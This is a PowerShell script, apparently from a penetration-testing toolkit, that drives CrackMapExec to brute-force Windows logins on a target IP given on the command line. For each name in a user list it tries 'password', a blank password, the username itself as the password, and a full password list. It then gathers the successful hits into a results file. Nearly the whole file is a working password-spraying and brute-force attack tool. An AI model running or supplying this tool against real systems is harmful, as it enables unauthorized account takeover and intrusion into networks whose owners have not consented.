<#

TO DO
=========
Make it so can run in CLI without having to set manually 

#>

$global:target=$args[0]



function run-cme {

# Set these variables accordingly 	
#$target = "192.168.80.50"


$userlist =  "C:\Windows\Temp\dusers.txt"

# Give FULL path to wordlist
#$passlist = "C:\Windows\Temp\onhost\wordlists\pass_top-500.txt"

$passlist = "C:\Windows\Temp\onhost\CrackMapExecWin\pass.txt"


# add the date at stat and end just for timing 
date 
echo "" > cme_brute_cracked.txt


# First try just 'password' for all users 
#-------
echo ""
cat $userlist | Out-File -Encoding ascii templist.txt
.\crackmapexec.exe $target -u templist.txt -p password
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
del templist.txt
echo ""
#-------



# Loop through the password list + user=password & user:<blank>
#-------
ForEach ($user in Get-Content $userlist) {
echo ""
write-host ===========================[ $user ]===========================
.\crackmapexec.exe $target -u $user -p $user
.\crackmapexec.exe $target -u $user -p " "
.\crackmapexec.exe $target -u $user -p $passlist 
write-host ================================================================
Get-Content .\cme_brute.txt | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}  
#-------


date
Get-Content .\cme_brute_cracked.txt
}

# Run 

if ($target) { 
run-cme | Tee cme_brute.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	./cme-brute.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



